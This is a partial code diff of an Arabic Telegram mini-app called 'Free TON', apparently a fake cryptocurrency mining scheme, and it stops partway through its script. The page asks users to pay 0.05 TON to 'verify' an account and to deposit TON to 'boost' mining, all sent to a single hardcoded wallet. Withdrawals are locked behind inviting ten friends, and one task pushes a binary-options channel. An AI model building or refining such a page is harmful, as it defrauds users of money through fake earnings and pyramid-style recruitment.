@@ -4,10 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>تون مجاني</title>
-<script src="https://telegram.org"></script>
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,-apple-system,sans-serif;-webkit-tap-highlight-color:transparent}
-body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 90px 14px}
+*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,-apple-system,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none}
+body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 95px 14px}
 .header{display:flex;justify-content:space-between;align-items:center;background:#1e293b;padding:12px 15px;border-radius:16px;border:1px solid #38bdf844}
 .card{background:#111827;border:1px solid #38bdf844;border-radius:20px;padding:18px 15px;text-align:center;margin-top:14px;display:none}
 .card.active{display:block}
@@ -17,23 +16,23 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 90px 14px}
 .miner-box{background:#090d16;border:1px solid #ffffff15;border-radius:16px;padding:14px;margin-bottom:14px}
 .miner-top{display:flex;justify-content:space-between;font-size:12px;color:#94a3b8;margin-bottom:8px}
 .unclaimed{font-size:26px;font-weight:bold;font-family:monospace;color:#7dd3fc}
-.btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;font-size:14px;font-weight:bold;color:#fff;cursor:pointer;text-decoration:none;text-align:center}
-.btn:active{opacity:0.8;transform:scale(0.99)}
+.btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;font-size:14px;font-weight:bold;color:#fff;cursor:pointer;text-decoration:none;text-align:center;touch-action:manipulation}
+.btn:active{opacity:0.75;transform:scale(0.98)}
 .btn-blue{background:#0284c7}
 .btn-green{background:#059669}
 .btn-orange{background:#d97706;margin-top:8px}
-.btn-sm{display:inline-block;padding:8px 14px;font-size:12px;border-radius:8px;background:#0284c7;color:#fff;text-decoration:none;font-weight:bold;border:none;cursor:pointer}
+.btn-sm{display:inline-block;padding:8px 14px;font-size:12px;border-radius:8px;background:#0284c7;color:#fff;text-decoration:none;font-weight:bold;border:none;cursor:pointer;touch-action:manipulation}
 .btn-done{background:#334155;color:#94a3b8;pointer-events:none}
 .boost-box{background:#d9770618;border:1px solid #f59e0b55;border-radius:16px;padding:14px;margin-top:14px;text-align:right}
 .task-item{display:flex;justify-content:space-between;align-items:center;background:#090d16;border:1px solid #ffffff15;padding:12px;border-radius:14px;margin-bottom:10px;text-align:right}
-.inp{width:100%;padding:12px;border-radius:10px;background:#090d16;border:1px solid #38bdf855;color:#fff;font-size:14px;margin-bottom:10px;text-align:right}
-.ref-box{background:#090d16;padding:12px;border-radius:10px;font-size:12px;color:#7dd3fc;word-break:break-all;margin:10px 0;border:1px dashed #38bdf866}
+.inp{width:100%;padding:12px;border-radius:10px;background:#090d16;border:1px solid #38bdf855;color:#fff;font-size:14px;margin-bottom:10px;text-align:right;user-select:text}
+.ref-box{background:#090d16;padding:12px;border-radius:10px;font-size:12px;color:#7dd3fc;word-break:break-all;margin:10px 0;border:1px dashed #38bdf866;user-select:text}
 .bottom-nav{position:fixed;bottom:10px;left:12px;right:12px;background:#0f172a;border:1px solid #38bdf855;border-radius:18px;display:flex;padding:10px 4px;z-index:9999}
-.nav-btn{flex:1;background:none;border:none;color:#64748b;font-size:11px;font-weight:bold;display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer}
+.nav-btn{flex:1;background:none;border:none;color:#64748b;font-size:11px;font-weight:bold;display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;touch-action:manipulation}
 .nav-btn.active{color:#38bdf8}
 .hidden{display:none!important}
-#toast{position:fixed;top:15px;left:15px;right:15px;background:#0284c7;color:#fff;padding:12px;border-radius:12px;font-size:13px;font-weight:bold;text-align:center;z-index:99999;display:none}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;padding:16px;z-index:10000}
+#toast{position:fixed;top:15px;left:15px;right:15px;background:#0284c7;color:#fff;padding:12px;border-radius:12px;font-size:13px;font-weight:bold;text-align:center;z-index:99999;display:none;box-shadow:0 4px 15px rgba(0,0,0,0.5)}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;padding:16px;z-index:10000}
 .modal-box{background:#1e293b;border:1px solid #38bdf866;border-radius:18px;padding:18px;width:100%;max-width:360px;text-align:center}
 </style>
 </head>
@@ -41,26 +40,40 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 90px 14px}
 
 <div id="toast"></div>
 
+<!-- نافذة الدفع -->
 <div id="pay-modal" class="modal">
   <div class="modal-box">
     <h3 id="m-title" style="color:#38bdf8;margin-bottom:8px;">تأكيد الدفع عبر TON</h3>
-    <p id="m-desc" style="font-size:13px;color:#cbd5e1;margin-bottom:12px;"></p>
-    <div id="m-wallet" class="ref-box" style="font-size:11px;">UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO</div>
+    <p id="m-desc" style="font-size:13px;color:#cbd5e1;margin-bottom:10px;"></p>
 
-<button type="button" id="m-open-wallet" class="btn btn-blue" style="margin-bottom:8px;">الدفع عبر محفظة Tonkeeper 💎</button>
+<div id="m-wallet" class="ref-box" style="font-size:11px;">UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO</div>
+    <button type="button" id="m-open-wallet" class="btn btn-blue" style="margin-bottom:8px;">فتح محفظة Tonkeeper للدفع 💎</button>
     <button type="button" id="m-confirm" class="btn btn-green" style="margin-bottom:8px;">تأكيد إتمام التحويل ✅</button>
-    <button type="button" onclick="closeModal()" class="btn" style="background:#334155;">إلغاء</button>
+    <button type="button" id="m-close" class="btn" style="background:#334155;">إلغاء</button>
   </div>
 </div>
 
+<!-- نافذة ربط المحفظة -->
+<div id="wallet-modal" class="modal">
+  <div class="modal-box">
+    <h3 style="color:#38bdf8;margin-bottom:8px;">ربط محفظة TON 💳</h3>
+    <p style="font-size:12px;color:#cbd5e1;margin-bottom:12px;">أدخل عنوان محفظتك (Tonkeeper أو محفظة تيليجرام):</p>
+    <input type="text" id="inp-wallet-addr" class="inp" placeholder="UQ... أو EQ...">
+    <button type="button" id="save-wallet-btn" class="btn btn-green" style="margin-bottom:8px;">حفظ المحفظة ✅</button>
+    <button type="button" id="close-wallet-btn" class="btn" style="background:#334155;">إغلاق</button>
+  </div>
+</div>
+
+<!-- الهيدر -->
 <div class="header">
   <div>
     <div style="font-size:17px;font-weight:bold;color:#38bdf8;">تون مجاني 💎</div>
     <div id="u-name" style="font-size:12px;color:#94a3b8;">مستخدم نشط ✅</div>
   </div>
-  <button type="button" id="w-btn" class="btn-sm" onclick="connectWallet()">ربط المحفظة 💳</button>
+  <button type="button" id="w-btn" class="btn-sm">ربط المحفظة 💳</button>
 </div>
 
+<!-- تبويب التعدين -->
 <div id="p-mine" class="card active">
   <div id="s-badge" class="badge">الحساب غير موثق ⚠️</div>
   <div style="font-size:12px;color:#94a3b8;">إجمالي رصيدك القابل للسحب</div>
@@ -73,16 +86,17 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 90px 14px}
     <div id="unc-txt" class="unclaimed">0.000000</div>
     <div style="font-size:11px;color:#64748b;">الأرباح المُعدّنة حالياً</div>
   </div>
-  <button type="button" id="btn-verify" class="btn btn-blue" onclick="doVerify()">توثيق الحساب وتفعيل التعدين (0.05 TON) ⚡</button>
-  <button type="button" id="btn-claim" class="btn btn-green hidden" onclick="doClaim()">جمع الأرباح إلى الرصيد (Claim) 💰</button>
+  <button type="button" id="btn-verify" class="btn btn-blue">توثيق الحساب وتفعيل التعدين (0.05 TON) ⚡</button>
+  <button type="button" id="btn-claim" class="btn btn-green hidden">جمع الأرباح إلى الرصيد (Claim) 💰</button>
   <div class="boost-box">
     <div style="font-size:14px;font-weight:bold;color:#fbbf24;margin-bottom:4px;">🚀 تسريع التعدين (+7% لكل 1 TON)</div>
     <div style="font-size:12px;color:#cbd5e1;margin-bottom:10px;">ضاعف أرباحك اليومية بإيداع 1 TON أو أكثر لزيادة السرعة 7% عن كل عملة.</div>
     <input type="number" id="inp-boost" class="inp" min="1" step="0.5" value="1" placeholder="الحد الأدنى 1 TON">
-    <button type="button" id="btn-boost" class="btn btn-orange" onclick="doBoost()">تسريع التعدين الآن (+7%) 🔥</button>
+    <button type="button" id="btn-boost" class="btn btn-orange">تسريع التعدين الآن (+7%) 🔥</button>
   </div>
 </div>
 
+<!-- تبويب المهام -->
 <div id="p-tasks" class="card">
   <h3 style="color:#38bdf8;margin-bottom:12px;">المهام اليومية 📋</h3>
   <div class="task-item">
@@ -90,77 +104,64 @@ body{background:#090d16;color:#fff;min-height:100vh;padding:14px 14px 90px 14px}
       <div style="font-size:13px;font-weight:bold;">اشترك في قناة توصيات بيناري أوبشن 📈</div>
       <div style="font-size:12px;color:#34d399;">+0.003 TON</div>
     </div>
-    <a href="https://t.me" target="_blank" id="t1" class="btn-sm" onclick="doT('join_forexgood45',0.003)">ابدأ</a>
+    <a href="https://t.me" target="_blank" id="t1" class="btn-sm">ابدأ</a>
   </div>
   <div class="task-item">
     <div>
       <div style="font-size:13px;font-weight:bold;">شارك التطبيق مع صديق</div>
       <div style="font-size:12px;color:#34d399;">+0.02 TON</div>
     </div>
-    <a href="https://t.me" target="_blank" id="t2" class="btn-sm" onclick="doT('share_story',0.02)">ابدأ</a>
+    <a href="https://t.me" target="_blank" id="t2" class="btn-sm">ابدأ</a>
   </div>
 </div>
 
+<!-- تبويب الأصدقاء -->
 <div id="p-friends" class="card">
   <h3 style="color:#38bdf8;margin-bottom:8px;">دعوة الأصدقاء 👥</h3>
   <p style="font-size:12px;color:#94a3b8;margin-bottom:12px;">احصل على +0.1 TON/يوم سرعة إضافية عن كل صديق يوثق حسابه!</p>
   <div style="background:#090d16;padding:12px;border-radius:14px;margin-bottom:12px;">
-    <div style="font-size:12px;color:#94a3b8;">أصدقاؤك الموثقون</div>
+
+<div style="font-size:12px;color:#94a3b8;">أصدقاؤك الموثقون</div>
     <div id="ref-txt" style="font-size:26px;font-weight:bold;margin-top:4px;">0</div>
   </div>
   <div id="ref-url" class="ref-box">https://t.me</div>
-  <button type="button" class="btn btn-blue" onclick="copyRef()">نسخ رابط الدعوة ومشاركته 📤</button>
+  <button type="button" id="btn-copy-ref" class="btn btn-blue">نسخ رابط الدعوة ومشاركته 📤</button>
 </div>
 
+<!-- تبويب السحب -->
 <div id="p-withdraw" class="card">
   <h3 style="color:#38bdf8;margin-bottom:10px;">سحب الأرباح 💸</h3>
   <div style="background:#090d16;padding:12px;border-radius:14px;margin-bottom:12px;text-align:right;font-size:12px;line-height:1.8;">
     <div>💰 الرصيد المتاح: <strong id="w-bal" style="color:#38bdf8;">0.000000 TON</strong></div>
-
-<div>🎯 الحد الأدنى: <strong id="w-min" style="color:#34d399;">0.20 TON (لأول مرة)</strong></div>
+    <div>🎯 الحد الأدنى: <strong id="w-min" style="color:#34d399;">0.20 TON (لأول مرة)</strong></div>
     <div id="w-req">👥 الشرط: <strong id="w-refs" style="color:#fbbf24;">دعوة 10 أصدقاء (0 / 10)</strong></div>
   </div>
   <input type="text" id="w-addr" class="inp" placeholder="عنوان محفظة TON (يبدأ بـ UQ أو EQ)">
   <input type="number" id="w-amt" class="inp" step="0.01" placeholder="المبلغ المراد سحبه (مثلاً 0.2)">
-  <button type="button" class="btn btn-green" onclick="doWd()">تأكيد طلب السحب 🚀</button>
+  <button type="button" id="btn-withdraw" class="btn btn-green">تأكيد طلب السحب 🚀</button>
 </div>
 
+<!-- شريط التنقل السفلي -->
 <div class="bottom-nav">
-  <button type="button" id="n-mine" class="nav-btn active" onclick="go('mine')"><span>⛏️</span><span>التعدين</span></button>
-  <button type="button" id="n-tasks" class="nav-btn" onclick="go('tasks')"><span>📋</span><span>المهام</span></button>
-  <button type="button" id="n-friends" class="nav-btn" onclick="go('friends')"><span>👥</span><span>الأصدقاء</span></button>
-  <button type="button" id="n-withdraw" class="nav-btn" onclick="go('withdraw')"><span>💸</span><span>السحب</span></button>
+  <button type="button" id="n-mine" class="nav-btn active"><span>⛏️</span><span>التعدين</span></button>
+  <button type="button" id="n-tasks" class="nav-btn"><span>📋</span><span>المهام</span></button>
+  <button type="button" id="n-friends" class="nav-btn"><span>👥</span><span>الأصدقاء</span></button>
+  <button type="button" id="n-withdraw" class="nav-btn"><span>💸</span><span>السحب</span></button>
 </div>
 
 <script>
-var WALLET = 'UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO';
-var BOT = 'https://t.me';
-var toastTimer = null;
+document.addEventListener('DOMContentLoaded', function() {
+  var WALLET = 'UQCMbAM6SJr8AzFZvSFOfTGod5f7Jsyss35uhK-Y2A9cIGsO';
+  var BOT = 'https://t.me';
+  var toastTimer = null;
 
-function toast(m) {
-  var el = document.getElementById('toast');
-  el.innerText = m;
-  el.style.display = 'block';
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(function() { el.style.display = 'none'; }, 3000);
-}
-
-function go(tab) {
-  var tabs = ['mine', 'tasks', 'friends', 'withdraw'];
-  for (var i = 0; i < tabs.length; i++) {
-    document.getElementById('p-' + tabs[i]).classList.remove('active');
-    document.getElementById('n-' + tabs[i]).classList.remove('active');
+  function toast(m) {
+    var el = document.getElementById('toast');
+    el.innerText = m;
+    el.style.display = 'block';
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function() { el.style.display = 'none'; }, 3000);
   }
-  document.getElementById('p-' + tab).classList.add('active');
-  document.getElementById('n-' + tab).classList.add('active');
-}
 
-var user = { id: 123456789, username: 'مستخدم_نشط' };
-try {
-  if (window.Telegram && window.Telegram.WebApp) {
-    window.Telegram.WebApp.ready();
-    window.Telegram.WebApp.expand();
-    if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
-      user = window.Telegram.WebApp.initDataUnsafe.user;
-    }
-  }
+  function go(tab) {
+    var tabs = ['mine', 'tasks', 'friends', 'withdraw'];
